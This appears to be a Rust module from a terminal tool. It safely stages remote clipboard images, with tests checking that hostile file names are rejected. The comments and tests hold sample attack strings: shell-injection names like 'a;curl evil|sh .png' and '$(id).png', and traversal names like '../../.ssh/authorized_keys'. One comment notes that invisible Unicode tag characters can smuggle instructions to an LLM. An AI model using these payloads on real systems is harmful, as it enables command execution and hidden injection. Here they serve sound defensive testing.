#![cfg(unix)]
//! Remote-side staging of a clipboard image pushed over a federated link.
//!
//! The mounting client sends image bytes plus a proposed file name; this module
//! writes the file on the serving host and hands back the absolute path the
//! client will inject into a pane. Both halves of that sentence are hostile
//! input to somebody:
//!
//! - the **proposed file name** comes from a peer that may be compromised, so
//!   it is validated against an ordered contract and *rejected*, never
//!   silently rewritten — a rewrite is how `evil<RLO>gnp.exe` becomes
//!   `evilexe.png`;
//! - the **returned path** is about to be written into a PTY that may have
//!   bracketed paste disabled, in which case the string reaches the shell raw.
//!   So the whole path — staging root included — must survive a conservative
//!   allowlist that admits no shell metacharacter. The client re-applies the
//!   very same predicate ([`is_injection_safe_path`]) before injecting.
//!
//! Two ordering invariants are load-bearing and must not be relaxed:
//!
//! 1. **Every rejection is decided before anything is created.** The staging
//!    root is proven usable — absolute, losslessly UTF-8, injection-safe, and
//!    (via [`crate::server::clipboard_image::ensure_staging_dir_at`]) a private
//!    directory this user owns rather than a symlink somebody planted — before
//!    it is created, chmod'd, swept, or written to; each individual candidate
//!    path is then validated before the `OpenOptions` call that would create
//!    it. A rejected stage therefore leaves nothing behind on the serving host
//!    and never reaches into a root it does not own.
//! 2. **`create_new` makes only *creation* exclusive.** A `write_all`/`flush`
//!    failure after it leaves a truncated file, so every failure past that
//!    point removes the candidate before returning. `?` is deliberately not
//!    used between the successful open and the successful return.
//!
//! Base64 decoding happens before this module is called, and a malformed
//! payload has its own failure variant, so an undecodable payload can never be
//! reported as a disk error.
//!
//! The staging directory, its 0700 mode, the 0600 file mode, and the 24h sweep
//! are deliberately shared with `crate::server::clipboard_image` rather than
//! duplicated.

use std::ffi::OsStr;
use std::fs;
use std::io::{self, Write as _};
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

use crate::protocol::MAX_CLIPBOARD_IMAGE_PAYLOAD;
use crate::remote::federation::protocol::ClipboardStageFailure;
use crate::remote::federation::sanitize::sanitize_remote_string;

/// Every file this module creates carries this prefix. It exists so the on-disk
/// name is never solely peer-chosen, and so the quota scan and the client-side
/// returned-path check can tell federation-staged files apart from the local
/// clipboard writer's files in the same shared directory.
pub(crate) const FEDERATION_CLIPBOARD_PREFIX: &str = "federation-clipboard-";

/// Total bytes of `FEDERATION_CLIPBOARD_PREFIX`-named files allowed to sit in
/// the staging directory. Checked after the 24h sweep, before any write.
const STAGING_DIR_QUOTA_BYTES: u64 = 500 * 1024 * 1024;

/// Longest single component any target filesystem accepts.
const MAX_COMPONENT_BYTES: usize = 255;

/// Bytes the generated name wraps around the proposed one: the prefix, a
/// nanosecond stamp, the attempt counter, and their separators. Budgeted
/// generously so the derived name stays bounded well past the current epoch.
const DERIVED_NAME_OVERHEAD_BYTES: usize = FEDERATION_CLIPBOARD_PREFIX.len() + 24 + 1 + 10 + 1 + 1;

/// Longest accepted proposed file name, in bytes. Deliberately smaller than
/// the filesystem limit: the proposal is never used as-is, it is embedded in a
/// generated name, so a proposal that would only fit on its own pushes that
/// name past the limit. Without this budget such a name fails at `open` with
/// `ENAMETOOLONG`, which the caller reports as "could not write the file"
/// rather than naming the real cause.
const MAX_ORIGINAL_FILENAME_BYTES: usize = MAX_COMPONENT_BYTES - DERIVED_NAME_OVERHEAD_BYTES;

/// Attempts to find an unused candidate path before giving up.
const CREATE_ATTEMPTS: u32 = 100;

/// Stages `bytes` into the shared euid-scoped staging directory under a name
/// derived from `original_filename`, returning the absolute path on this host.
pub(crate) fn stage_remote_clipboard_image(
    original_filename: &str,
    bytes: &[u8],
) -> Result<PathBuf, ClipboardStageFailure> {
    if bytes.len() > MAX_CLIPBOARD_IMAGE_PAYLOAD {
        return Err(ClipboardStageFailure::PayloadTooLarge);
    }
    // The root is checked for shape before it is created, chmod'd, or swept:
    // `ensure_staging_dir_at` would otherwise be the first thing to touch a
    // `TMPDIR` this host has no business writing into.
    let dir = crate::server::clipboard_image::staging_dir();
    validate_staging_root(&dir)?;
    crate::server::clipboard_image::ensure_staging_dir_at(&dir).map_err(|err| {
        tracing::warn!(error = %err, "federation clipboard staging directory unavailable");
        ClipboardStageFailure::StagingUnavailable
    })?;
    stage_into(&dir, original_filename, bytes)
}

/// [`stage_remote_clipboard_image`] against an explicitly supplied directory.
/// The directory is a parameter rather than read from the process-global
/// `TMPDIR` so tests can exercise the real ordering without mutating a
/// process-global that sibling in-binary tests share.
pub(crate) fn stage_into(
    dir: &Path,
    original_filename: &str,
    bytes: &[u8],
) -> Result<PathBuf, ClipboardStageFailure> {
    stage_into_with(
        dir,
        original_filename,
        bytes,
        &is_injection_safe_path,
        &FileWrite::production(),
    )
}

/// The three fallible steps that follow a successful `create_new`. They are
/// injectable because each one must independently remove the file it would
/// otherwise leave truncated on the serving host, and only a seam makes those
/// branches deterministically reachable. Production always uses
/// [`FileWrite::production`].
struct FileWrite<'a> {
    write: &'a dyn Fn(&mut fs::File, &[u8]) -> io::Result<()>,
    flush: &'a dyn Fn(&mut fs::File) -> io::Result<()>,
    sync: &'a dyn Fn(&mut fs::File) -> io::Result<()>,
}

impl FileWrite<'static> {
    fn production() -> Self {
        Self {
            write: &|file, bytes| file.write_all(bytes),
            flush: &|file| file.flush(),
            sync: &|file| file.sync_all(),
        }
    }
}

/// The single real implementation. `candidate_ok` and `file_write` are seams so
/// the candidate-rejection and partial-write branches are deterministically
/// reachable; production always passes [`is_injection_safe_path`] and
/// [`FileWrite::production`].
fn stage_into_with(
    dir: &Path,
    original_filename: &str,
    bytes: &[u8],
    candidate_ok: &dyn Fn(&str) -> bool,
    file_write: &FileWrite<'_>,
) -> Result<PathBuf, ClipboardStageFailure> {
    // Defence in depth: the sending side also pre-checks the payload size.
    if bytes.len() > MAX_CLIPBOARD_IMAGE_PAYLOAD {
        return Err(ClipboardStageFailure::PayloadTooLarge);
    }

    // The staging root is `TMPDIR`-derived and therefore environment-chosen.
    // A root that is relative, not losslessly UTF-8, or not injection-safe can
    // never yield a usable path, so it is rejected before anything is created.
    validate_staging_root(dir)?;

    // Evict first so the quota is measured against what actually survives.
    crate::server::clipboard_image::cleanup_stale(dir);

    // Scoped to this module's own prefix: the directory is shared with the
    // local clipboard writer, and a purely local paste must not be able to
    // trip a remote quota rejection.
    if staging_dir_total_bytes(dir).saturating_add(bytes.len() as u64) > STAGING_DIR_QUOTA_BYTES {
        tracing::warn!("federation clipboard staging directory is over its total-bytes quota");
        return Err(ClipboardStageFailure::QuotaExceeded);
    }

    let name = sanitize_original_filename(original_filename)?;

    let unique = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|elapsed| elapsed.as_nanos())
        .unwrap_or(0);

    for attempt in 0..CREATE_ATTEMPTS {
        let path = dir.join(format!(
            "{FEDERATION_CLIPBOARD_PREFIX}{unique}-{attempt}-{}.{}",
            name.stem, name.extension
        ));

        // Validate this exact candidate BEFORE creating it. A check placed
        // after the write could only orphan an artifact on the serving host.
        let Some(candidate) = path.to_str() else {
            tracing::warn!("federation clipboard candidate path is not lossless utf-8");
            return Err(ClipboardStageFailure::StagingUnavailable);
        };
        if !candidate_ok(candidate) {
            tracing::warn!(
                candidate = candidate,
                "federation clipboard candidate path fails the injection-safety allowlist"
            );
            return Err(ClipboardStageFailure::StagingUnavailable);
        }

        let mut options = fs::OpenOptions::new();
        options.write(true).create_new(true);
        crate::server::clipboard_image::restrict_file_options(&mut options);
        let mut file = match options.open(&path) {
            Ok(file) => file,
            Err(err) if err.kind() == io::ErrorKind::AlreadyExists => continue,
            Err(err) => {
                tracing::warn!(error = %err, "federation clipboard staging file create failed");
                return Err(ClipboardStageFailure::WriteFailed);
            }
        };

        // Past this point the file exists, so no `?`: every failure removes the
        // file it just created before returning, or a truncated image is left
        // behind consuming quota until the next sweep.
        if let Err(err) = (file_write.write)(&mut file, bytes) {
            return Err(remove_partial(&path, err));
        }
        if let Err(err) = (file_write.flush)(&mut file) {
            return Err(remove_partial(&path, err));
        }
        if let Err(err) = (file_write.sync)(&mut file) {
            return Err(remove_partial(&path, err));
        }
        return Ok(path);
    }

    tracing::warn!("federation clipboard staging exhausted its unique-path attempts");
    Err(ClipboardStageFailure::WriteFailed)
}

/// Removes a candidate whose write failed part-way. The removal failure is
/// logged but never masks the original error.
fn remove_partial(path: &Path, err: io::Error) -> ClipboardStageFailure {
    tracing::warn!(error = %err, "federation clipboard staging write failed");
    if let Err(remove_err) = fs::remove_file(path) {
        tracing::warn!(
            error = %remove_err,
            "failed to remove a partially written federation clipboard staging file"
        );
    }
    ClipboardStageFailure::WriteFailed
}

struct SanitizedFilename {
    stem: String,
    extension: &'static str,
}

/// The ordered file-name contract. The steps are sequential guards on purpose:
/// performing them out of order re-opens path traversal (a name is only safe to
/// inspect as a bare component *after* it has been proven to contain no
/// separator), and the order is what makes each rejection reason accurate.
fn sanitize_original_filename(filename: &str) -> Result<SanitizedFilename, ClipboardStageFailure> {
    // 1. Non-empty and within the longest name any of our targets accept.
    if filename.is_empty() || filename.len() > MAX_ORIGINAL_FILENAME_BYTES {
        return Err(reject_filename("empty or over-length"));
    }

    // 2. No interior NUL: it truncates the name at every syscall boundary, so
    //    everything checked after it would be checking a different string.
    if filename.bytes().any(|byte| byte == 0) {
        return Err(reject_filename("contains a NUL byte"));
    }

    // 3. It must be a single path component. `file_name()` returning `None`
    //    catches `.`, `..`, and anything ending in a separator.
    let Some(component) = Path::new(filename).file_name() else {
        return Err(reject_filename("is not a single path component"));
    };

    // 4. And that component must be the whole input — otherwise the input
    //    carried a separator (`../../.ssh/authorized_keys`, `/etc/passwd`) and
    //    accepting the tail would silently honour an escape attempt. A leading
    //    `~` is rejected for the same reason: it is expanded, not literal, by
    //    every shell the returned path may reach.
    if component != OsStr::new(filename) {
        return Err(reject_filename("contains a path separator"));
    }
    if filename.starts_with('~') {
        return Err(reject_filename("starts with a home-directory expansion"));
    }

    // 5. No control bytes and no bidi overrides. Bidi is checked here and not
    //    left to the C0/C1 filter because it is not a control byte: it is a
    //    rendering directive, and `evil<RLO>gnp.exe` *renders* as
    //    `evilexe.png`. Reject rather than strip — a silent rename would show
    //    the user one name and write another.
    let stripped = strip_controls_and_bidi(filename);
    if stripped != filename {
        return Err(reject_filename(
            "contains control or bidi-override characters",
        ));
    }

    // 5b. Reject, do not strip, anything outside a conservative allowlist. The
    //     staged path can reach a PTY with bracketed paste disabled, where a
    //     legal-but-hostile name such as `a;curl evil|sh .png` would manufacture
    //     a shell-executable path. The client enforces this same allowlist.
    if !filename.chars().all(is_allowed_name_char) {
        return Err(reject_filename("contains a disallowed character"));
    }

    // 6. No trailing dot or space: both are invisible and both are stripped or
    //    reinterpreted by some filesystems, which would make the on-disk name
    //    differ from the validated one.
    if filename.ends_with('.') || filename.ends_with(' ') {
        return Err(reject_filename("ends with a dot or space"));
    }

    // 7. Discard whatever extension was carried and re-derive it from the
    //    validated suffix against the image allowlist. A miss is a hard error:
    //    falling back to `png` would let an arbitrary payload be staged under
    //    an image name.
    let Some((stem, suffix)) = filename.rsplit_once('.') else {
        return Err(ClipboardStageFailure::UnsupportedExtension);
    };
    let Some(extension) = derive_extension(suffix) else {
        return Err(ClipboardStageFailure::UnsupportedExtension);
    };
    // A name that is nothing but an extension (`.png`) has no stem to preserve,
    // so there is nothing to carry across; reject it rather than inventing one.
    if stem.is_empty() {
        return Err(reject_filename("has no stem"));
    }

    Ok(SanitizedFilename {
        stem: stem.to_string(),
        extension,
    })
}

fn reject_filename(reason: &'static str) -> ClipboardStageFailure {
    tracing::warn!(reason, "rejected a federation clipboard staging file name");
    ClipboardStageFailure::InvalidFilename
}

fn derive_extension(suffix: &str) -> Option<&'static str> {
    if suffix.eq_ignore_ascii_case("png") {
        Some("png")
    } else if suffix.eq_ignore_ascii_case("jpg") || suffix.eq_ignore_ascii_case("jpeg") {
        Some("jpg")
    } else if suffix.eq_ignore_ascii_case("gif") {
        Some("gif")
    } else if suffix.eq_ignore_ascii_case("webp") {
        Some("webp")
    } else if suffix.eq_ignore_ascii_case("bmp") {
        Some("bmp")
    } else {
        None
    }
}

/// C0/C1/DEL (shared with the chrome-string sanitizer) plus the bidi-control
/// block `U+200E`, `U+200F`, `U+202A..=U+202E`, `U+2066..=U+2069`, which the
/// control-byte filter does not cover.
fn strip_controls_and_bidi(s: &str) -> String {
    sanitize_remote_string(s)
        .chars()
        .filter(|ch| !is_bidi_control(*ch))
        .collect()
}

fn is_bidi_control(ch: char) -> bool {
    matches!(ch as u32, 0x200E | 0x200F | 0x202A..=0x202E | 0x2066..=0x2069)
}

/// Characters that occupy no visible width, or that reorder or terminate the
/// line around them, and so make the rendered string differ from the bytes.
///
/// `char::is_control` covers only category Cc, which is why this exists: the
/// staged path is pasted into a pane where the user's eyes are the last check
/// before an agent reads it. An invisible character in that path can hide what
/// the path really is, and the tag block `U+E0000..=U+E007F` in particular
/// encodes ASCII invisibly — text an LLM reading the pane will decode as
/// instructions. The set is the Unicode format category (Cf, which subsumes
/// every [`is_bidi_control`] character), the line and paragraph separators
/// (Zl/Zp), the non-ASCII space separators (Zs), and the tag block.
fn is_invisible_or_reordering(ch: char) -> bool {
    matches!(
        ch as u32,
        // Cf, format characters.
        0x00AD
            | 0x0600..=0x0605
            | 0x061C
            | 0x06DD
            | 0x070F
            | 0x0890..=0x0891
            | 0x08E2
            | 0x180E
            | 0x200B..=0x200F
            | 0x202A..=0x202E
            | 0x2060..=0x2064
            | 0x2066..=0x206F
            | 0xFEFF
            | 0xFFF9..=0xFFFB
            | 0x110BD
            | 0x110CD
            | 0x13430..=0x1343F
            | 0x1BCA0..=0x1BCA3
            | 0x1D173..=0x1D17A
            // Zl and Zp, line and paragraph separators.
            | 0x2028..=0x2029
            // Zs, space separators outside ASCII.
            | 0x00A0
            | 0x1680
            | 0x2000..=0x200A
            | 0x202F
            | 0x205F
            | 0x3000
            // The tag block, an invisible ASCII transport.
            | 0xE0000..=0xE007F
    )
}

/// The one character-level allowlist. Both the proposed file name and the
/// returned path are held to it, so they cannot drift apart.
fn is_allowed_name_char(ch: char) -> bool {
    if ch.is_ascii() {
        // Excludes ASCII controls, space, and every shell metacharacter.
        ch.is_ascii_alphanumeric() || matches!(ch, '.' | '_' | '@' | '+' | '-')
    } else {
        // Ordinary international letters are legitimate in a file name; only
        // characters that do not render as themselves are not.
        !is_invisible_or_reordering(ch)
    }
}

/// The allowlist the staged path must satisfy before it is handed back to the
/// client for injection. Identical to [`is_allowed_name_char`] plus the path
/// separator; the client applies this exact predicate to the path it receives,
/// so the two halves cannot drift.
pub(crate) fn is_injection_safe_path(path: &str) -> bool {
    !path.is_empty() && path.chars().all(|ch| ch == '/' || is_allowed_name_char(ch))
}

/// Sums the sizes of this module's own staged files. Unreadable entries are
/// skipped rather than failing the stage: an unreadable neighbour is not this
/// request's fault, and the quota is a safety valve, not an accounting record.
fn staging_dir_total_bytes(dir: &Path) -> u64 {
    let Ok(entries) = fs::read_dir(dir) else {
        return 0;
    };
    entries
        .flatten()
        .filter(|entry| {
            entry
                .file_name()
                .to_str()
                .is_some_and(|name| name.starts_with(FEDERATION_CLIPBOARD_PREFIX))
        })
        .filter_map(|entry| entry.metadata().ok())
        .map(|metadata| metadata.len())
        .fold(0u64, |total, len| total.saturating_add(len))
}

/// Requires the staging root to be absolute, losslessly UTF-8 (no
/// `to_string_lossy` anywhere in this module — a mangled path is worse than no
/// path), and injection-safe.
fn validate_staging_root(dir: &Path) -> Result<(), ClipboardStageFailure> {
    if !dir.is_absolute() {
        tracing::warn!(root = %dir.display(), "federation clipboard staging root is not absolute");
        return Err(ClipboardStageFailure::StagingUnavailable);
    }
    let Some(root) = dir.to_str() else {
        tracing::warn!(
            root = %dir.display(),
            "federation clipboard staging root is not lossless utf-8"
        );
        return Err(ClipboardStageFailure::StagingUnavailable);
    };
    if !is_injection_safe_path(root) {
        tracing::warn!(
            root = root,
            "federation clipboard staging root fails the injection-safety allowlist"
        );
        return Err(ClipboardStageFailure::StagingUnavailable);
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::protocol::MAX_CLIPBOARD_IMAGE_PAYLOAD;
    use std::os::unix::ffi::OsStrExt as _;
    use std::os::unix::fs::PermissionsExt as _;
    use std::time::Duration;

    const PNG_BYTES: &[u8] = b"\x89PNG\r\n\x1a\nfake";

    /// A private staging root for one test. Never `TMPDIR`: `staging_dir()` is
    /// process-global and sibling tests run as threads in the same binary.
    struct TestDir {
        path: PathBuf,
    }

    impl TestDir {
        fn new(label: &str) -> Self {
            let unique = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .map(|d| d.as_nanos())
                .unwrap_or(0);
            let path = std::env::temp_dir().join(format!(
                "herdr-federation-staging-test-{}-{label}-{unique}",
                std::process::id()
            ));
            fs::create_dir_all(&path).expect("create test staging dir");
            Self { path }
        }

        fn child(&self, name: &std::ffi::OsStr) -> PathBuf {
            let path = self.path.join(name);
            fs::create_dir_all(&path).expect("create test staging child dir");
            path
        }

        fn entries(&self) -> Vec<String> {
            entries_in(&self.path)
        }

        fn staged_entries(&self) -> Vec<String> {
            self.entries()
                .into_iter()
                .filter(|name| name.starts_with(FEDERATION_CLIPBOARD_PREFIX))
                .collect()
        }
    }

    impl Drop for TestDir {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.path);
        }
    }

    fn entries_in(dir: &Path) -> Vec<String> {
        let Ok(read) = fs::read_dir(dir) else {
            return Vec::new();
        };
        read.flatten()
            .map(|entry| entry.file_name().to_string_lossy().into_owned())
            .collect()
    }

    /// Positive control shared by every rejection test: the same call shape with
    /// a benign name must succeed in the same directory, so a "reject
    /// everything" implementation cannot pass these tests.
    fn assert_benign_stage_succeeds(dir: &TestDir) {
        let staged = stage_into(&dir.path, "diagram.png", PNG_BYTES)
            .expect("a benign image name must stage successfully");
        assert!(staged.exists(), "positive control produced no file");
        fs::remove_file(&staged).expect("clean up positive control");
    }

    #[test]
    fn stage_rejects_path_traversal_in_original_filename() {
        let dir = TestDir::new("traversal");
        for hostile in ["../../.ssh/authorized_keys", "..", "./x.png", "a/b.png"] {
            assert_eq!(
                stage_into(&dir.path, hostile, PNG_BYTES),
                Err(ClipboardStageFailure::InvalidFilename),
                "{hostile} must be rejected"
            );
        }
        assert!(
            dir.entries().is_empty(),
            "a rejected traversal name wrote something: {:?}",
            dir.entries()
        );
        assert_benign_stage_succeeds(&dir);
    }

    #[test]
    fn stage_rejects_absolute_path_filename() {
        let dir = TestDir::new("absolute");
        assert_eq!(
            stage_into(&dir.path, "/etc/passwd", PNG_BYTES),
            Err(ClipboardStageFailure::InvalidFilename)
        );
        assert!(dir.entries().is_empty());
        assert_benign_stage_succeeds(&dir);
    }

    #[test]
    fn stage_rejects_null_byte_in_filename() {
        let dir = TestDir::new("nul");
        assert_eq!(
            stage_into(&dir.path, "a\0b.png", PNG_BYTES),
            Err(ClipboardStageFailure::InvalidFilename)
        );
        assert!(dir.entries().is_empty());
        assert_benign_stage_succeeds(&dir);
    }

    #[test]
    fn stage_rejects_or_strips_bidi_override_in_filename() {
        let dir = TestDir::new("bidi");
        assert_eq!(
            stage_into(&dir.path, "evil\u{202E}gnp.exe", PNG_BYTES),
            Err(ClipboardStageFailure::InvalidFilename),
            "a right-to-left override must be rejected, never silently renamed"
        );
        // Not a rename to `evilexe.png`: nothing at all was created.
        assert!(
            dir.entries().is_empty(),
            "bidi name produced a file: {:?}",
            dir.entries()
        );
        // The same stem without the override is accepted, proving the guard is
        // the override and not the word.
        let staged = stage_into(&dir.path, "evil.png", PNG_BYTES).expect("plain stem stages");
        assert!(staged.exists());
    }

    #[test]
    fn stage_rejects_unknown_extension_instead_of_png_fallback() {
        let dir = TestDir::new("ext");
        assert_eq!(
            stage_into(&dir.path, "payload.sh", PNG_BYTES),
            Err(ClipboardStageFailure::UnsupportedExtension)
        );
        assert_eq!(
            stage_into(&dir.path, "payload", PNG_BYTES),
            Err(ClipboardStageFailure::UnsupportedExtension),
            "a name with no extension has nothing to derive from"
        );
        assert!(
            dir.entries().iter().all(|name| !name.ends_with(".png")),
            "an unknown extension fell back to png: {:?}",
            dir.entries()
        );
        assert_benign_stage_succeeds(&dir);
    }

    #[test]
    fn stage_rejects_oversized_filename() {
        let dir = TestDir::new("oversized");
        let long = format!("{}.png", "a".repeat(296));
        assert_eq!(long.len(), 300);
        assert_eq!(
            stage_into(&dir.path, &long, PNG_BYTES),
            Err(ClipboardStageFailure::InvalidFilename)
        );
        assert_eq!(
            stage_into(&dir.path, "", PNG_BYTES),
            Err(ClipboardStageFailure::InvalidFilename)
        );
        assert!(dir.entries().is_empty());
        assert_benign_stage_succeeds(&dir);
    }

    // The accepted name is embedded in a longer generated one, so the limit has
    // to leave room for what wraps it. Without that budget the longest accepted
    // proposal produces a path the filesystem refuses, and the caller reports a
    // write failure instead of naming the real cause.
    #[test]
    fn the_longest_accepted_filename_still_fits_on_disk() {
        let dir = TestDir::new("longest-accepted");
        let stem = "a".repeat(MAX_ORIGINAL_FILENAME_BYTES - ".png".len());
        let longest = format!("{stem}.png");
        assert_eq!(longest.len(), MAX_ORIGINAL_FILENAME_BYTES);

        let staged = stage_into(&dir.path, &longest, PNG_BYTES).expect("longest name is accepted");

        let component = std::path::Path::new(&staged)
            .file_name()
            .expect("staged path has a file name")
            .to_string_lossy()
            .into_owned();
        assert!(
            component.len() <= MAX_COMPONENT_BYTES,
            "generated name is {} bytes, over the {MAX_COMPONENT_BYTES} the filesystem accepts: {component}",
            component.len()
        );
    }

    #[test]
    fn stage_rejects_shell_metacharacters_in_original_filename() {
        let dir = TestDir::new("metachars");
        for hostile in [
            "a;b.png",
            "a b.png",
            "$(id).png",
            "`id`.png",
            "a|b.png",
            "a&b.png",
            "a>b.png",
            "a<b.png",
            "a'b.png",
            "a\"b.png",
            "a*b.png",
            "a?b.png",
            "a!b.png",
            "a#b.png",
            "a{b}.png",
            "a[b].png",
            "a\\b.png",
            "~evil.png",
        ] {
            assert_eq!(
                stage_into(&dir.path, hostile, PNG_BYTES),
                Err(ClipboardStageFailure::InvalidFilename),
                "{hostile} must be rejected"
            );
        }
        assert!(
            dir.entries().is_empty(),
            "a shell-metacharacter name wrote something: {:?}",
            dir.entries()
        );
        assert_benign_stage_succeeds(&dir);
    }

    #[test]
    fn stage_preserves_the_original_filename_stem_behind_a_collision_proof_prefix() {
        let dir = TestDir::new("stem");
        let staged = stage_into(&dir.path, "diagram.PNG", PNG_BYTES).expect("stages");
        let name = staged
            .file_name()
            .and_then(|n| n.to_str())
            .expect("utf-8 name")
            .to_string();
        assert!(name.starts_with(FEDERATION_CLIPBOARD_PREFIX), "{name}");
        assert!(name.ends_with("-diagram.png"), "{name}");
        assert_eq!(fs::read(&staged).expect("read back"), PNG_BYTES);

        // A printable non-ASCII stem survives, and `jpeg` normalises to `jpg`.
        let staged_unicode = stage_into(&dir.path, "héllo-wörld.JPEG", PNG_BYTES).expect("stages");
        let unicode_name = staged_unicode
            .file_name()
            .and_then(|n| n.to_str())
            .expect("utf-8 name")
            .to_string();
        assert!(unicode_name.ends_with("-héllo-wörld.jpg"), "{unicode_name}");
    }

    #[test]
    fn stage_rejects_a_payload_over_the_image_size_limit() {
        let dir = TestDir::new("payload");
        let oversized = vec![0u8; MAX_CLIPBOARD_IMAGE_PAYLOAD + 1];
        assert_eq!(
            stage_into(&dir.path, "big.png", &oversized),
            Err(ClipboardStageFailure::PayloadTooLarge)
        );
        assert!(dir.entries().is_empty());
        let at_limit = vec![0u8; 1024];
        stage_into(&dir.path, "small.png", &at_limit).expect("an in-limit payload stages");
    }

    #[test]
    fn stage_rejects_a_write_that_would_exceed_the_staging_directory_quota() {
        let dir = TestDir::new("quota");

        // Non-prefixed files (the local clipboard writer's) must NOT count, or a
        // purely local paste would trigger a remote quota rejection.
        sparse_file(
            &dir.path.join("client-1-clipboard-1-0.png"),
            600 * 1024 * 1024,
        );
        stage_into(&dir.path, "ok.png", PNG_BYTES)
            .expect("unprefixed neighbours do not consume the federation quota");

        sparse_file(
            &dir.path
                .join(format!("{FEDERATION_CLIPBOARD_PREFIX}filler.png")),
            600 * 1024 * 1024,
        );
        assert_eq!(
            stage_into(&dir.path, "over.png", PNG_BYTES),
            Err(ClipboardStageFailure::QuotaExceeded)
        );
    }

    fn sparse_file(path: &Path, len: u64) {
        let file = fs::File::create(path).expect("create sparse file");
        file.set_len(len).expect("set sparse length");
    }

    #[test]
    fn staged_file_is_created_exclusively_with_owner_only_permissions() {
        // Deliberately the public entry point: the 0700 directory mode is
        // `ensure_staging_dir`'s guarantee, and asserting it against a
        // test-created directory would only assert the test's own setup.
        let staged = stage_remote_clipboard_image("perms.png", PNG_BYTES).expect("stages");
        let file_mode = fs::metadata(&staged)
            .expect("file metadata")
            .permissions()
            .mode();
        assert_eq!(file_mode & 0o777, 0o600, "staged file mode {file_mode:o}");
        let dir = staged.parent().expect("staged file has a parent");
        let dir_mode = fs::metadata(dir)
            .expect("dir metadata")
            .permissions()
            .mode();
        assert_eq!(dir_mode & 0o777, 0o700, "staging dir mode {dir_mode:o}");
        fs::remove_file(&staged).expect("clean up");
    }

    #[test]
    fn stage_rejects_a_staging_root_that_is_not_injection_safe() {
        let dir = TestDir::new("root");
        for hostile in ["with space", "with;semicolon", "with|pipe", "with$dollar"] {
            let root = dir.child(std::ffi::OsStr::new(hostile));
            assert_eq!(
                stage_into(&root, "diagram.png", PNG_BYTES),
                Err(ClipboardStageFailure::StagingUnavailable),
                "root {hostile} must be rejected"
            );
            assert!(
                entries_in(&root).is_empty(),
                "root {hostile} was written to before it was rejected"
            );
        }

        // A relative root is rejected as unusable, not attempted.
        assert_eq!(
            stage_into(
                Path::new("herdr-relative-staging-root-must-never-be-used"),
                "diagram.png",
                PNG_BYTES
            ),
            Err(ClipboardStageFailure::StagingUnavailable)
        );
        assert!(!Path::new("herdr-relative-staging-root-must-never-be-used").exists());

        // Positive control: the same call against the clean parent root works.
        assert_benign_stage_succeeds(&dir);
    }

    #[test]
    fn stage_rejects_a_staging_root_that_is_not_lossless_utf8() {
        let dir = TestDir::new("nonutf8");
        // Not created on disk: APFS rejects a non-UTF-8 component with EILSEQ,
        // so the directory cannot exist here. That is fine — the point is that
        // the root is rejected on its bytes, before any filesystem call, and a
        // lossy substitution never reaches the returned value.
        let root = dir.path.join(std::ffi::OsStr::from_bytes(&[0xff]));
        assert_eq!(
            stage_into(&root, "diagram.png", PNG_BYTES),
            Err(ClipboardStageFailure::StagingUnavailable),
            "a lossy root name must be rejected, not written through"
        );
        assert!(
            dir.entries().is_empty(),
            "a lossy root produced filesystem state: {:?}",
            dir.entries()
        );
        assert_benign_stage_succeeds(&dir);
    }

    #[test]
    fn a_rejected_candidate_final_path_leaves_no_file_on_disk() {
        let dir = TestDir::new("candidate");
        let reject_all = |_: &str| false;
        assert_eq!(
            stage_into_with(
                &dir.path,
                "diagram.png",
                PNG_BYTES,
                &reject_all,
                &FileWrite::production()
            ),
            Err(ClipboardStageFailure::StagingUnavailable)
        );
        assert!(
            dir.entries().is_empty(),
            "the candidate was created before it was validated: {:?}",
            dir.entries()
        );

        // Positive control through the same seam: an accepting validator stages.
        let accept_all = |_: &str| true;
        stage_into_with(
            &dir.path,
            "diagram.png",
            PNG_BYTES,
            &accept_all,
            &FileWrite::production(),
        )
        .expect("an accepted candidate stages");
        assert_eq!(dir.staged_entries().len(), 1);
    }

    #[test]
    fn every_step_after_the_file_exists_removes_it_when_it_fails() {
        let short_write = |file: &mut fs::File, bytes: &[u8]| {
            file.write_all(&bytes[..bytes.len() / 2])?;
            Err(io::Error::other("simulated short write"))
        };
        let fail = |_: &mut fs::File| Err(io::Error::other("simulated failure"));
        let ok_write = |file: &mut fs::File, bytes: &[u8]| file.write_all(bytes);
        let ok = |_: &mut fs::File| Ok(());

        // Each of the three post-creation steps is pinned on its own: the other
        // two succeed, so only the named step's own cleanup can be under test.
        let cases: [(&str, FileWrite<'_>); 3] = [
            (
                "write",
                FileWrite {
                    write: &short_write,
                    flush: &ok,
                    sync: &ok,
                },
            ),
            (
                "flush",
                FileWrite {
                    write: &ok_write,
                    flush: &fail,
                    sync: &ok,
                },
            ),
            (
                "sync",
                FileWrite {
                    write: &ok_write,
                    flush: &ok,
                    sync: &fail,
                },
            ),
        ];

        for (label, file_write) in cases {
            let dir = TestDir::new(label);
            assert_eq!(
                stage_into_with(
                    &dir.path,
                    "diagram.png",
                    PNG_BYTES,
                    &is_injection_safe_path,
                    &file_write
                ),
                Err(ClipboardStageFailure::WriteFailed),
                "a failing {label} must fail the stage"
            );
            assert!(
                dir.staged_entries().is_empty(),
                "a failing {label} left a file behind: {:?}",
                dir.staged_entries()
            );

            // Positive control: the same fixture with every step working leaves
            // exactly one file, so the emptiness above is cleanup, not a stage
            // that never got as far as creating anything.
            stage_into_with(
                &dir.path,
                "diagram.png",
                PNG_BYTES,
                &is_injection_safe_path,
                &FileWrite::production(),
            )
            .expect("a working writer stages");
            assert_eq!(dir.staged_entries().len(), 1, "{label} positive control");
        }
    }

    #[test]
    fn staged_path_returned_to_the_client_satisfies_the_shared_path_allowlist() {
        let dir = TestDir::new("allowlist");
        let staged = stage_into(&dir.path, "diagram.png", PNG_BYTES).expect("stages");
        let as_str = staged.to_str().expect("staged path is lossless utf-8");
        assert!(staged.is_absolute(), "{as_str}");
        assert!(
            is_injection_safe_path(as_str),
            "the returned path fails the guard the client applies: {as_str}"
        );
        // The predicate is a real guard, not a constant `true`.
        assert!(!is_injection_safe_path("/tmp/a;curl evil|sh.png"));
        assert!(!is_injection_safe_path("/tmp/a\nb.png"));
        assert!(is_injection_safe_path("/tmp/héllo/a-b_c.png"));
    }

    /// Characters that render as nothing, reorder what surrounds them, or end
    /// the line. A path carrying one does not show the user what it is, and the
